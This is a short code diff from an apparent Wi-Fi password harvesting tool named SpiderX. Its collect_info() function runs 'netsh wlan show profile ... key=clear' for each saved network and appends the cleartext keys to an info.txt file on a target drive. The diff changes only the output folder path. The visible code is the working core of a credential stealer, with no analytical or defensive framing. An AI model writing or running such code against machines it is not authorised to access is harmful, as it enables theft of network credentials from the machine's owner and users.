@@ -61,7 +61,7 @@ def collect_info():
         command = f'netsh wlan show profile name="{i}" key=clear'
         # Decode the bytes output to string
         output_str = run_command(command)
-        path = f"{drive}\\SpiderX\\WIFI-password\\info.txt"
+        path = f"{drive}\\SpiderX\\WIFI-password\\SpiderX\\info.txt"
         with open(path, "a") as F:
             F.writelines(output_str)
             F.write("\n")
